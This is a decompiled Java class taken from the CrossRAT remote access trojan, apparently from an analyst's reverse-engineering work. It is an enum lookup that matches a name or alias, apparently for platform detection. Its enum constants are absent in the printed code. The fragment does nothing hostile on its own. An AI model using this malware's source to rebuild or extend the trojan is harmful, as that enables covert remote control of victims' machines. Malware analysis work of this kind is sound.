package a.a;

import crossrat.e;

public enum b
{
  private String f;
  private String[] g;
  
  private b(String paramString1, String... paramVarArgs)
  {
    this.f = paramString1;
    this.g = paramVarArgs;
  }
  
  public final String a()
  {
    return this.f;
  }
  
  public static b a(String paramString)
  {
    b[] arrayOfb;
    int j = (arrayOfb = values()).length;
    for (int i = 0; i < j; i++)
    {
      b localb1;
      b localb2;
      if ((localb2 = localb1 = arrayOfb[i]).f.toLowerCase().contains(paramString.toLowerCase())) {
        return localb1;
      }
      String[] arrayOfString;
      int m = (arrayOfString = (localb2 = localb1).g).length;
      for (int k = 0; k < m; k++) {
        if ((localb2 = arrayOfString[k]).toLowerCase().contains(paramString.toLowerCase())) {
          return localb1;
        }
      }
    }
    return null;
  }
  
  public static b b()
  {
    return e.a(true);
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\a\a\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */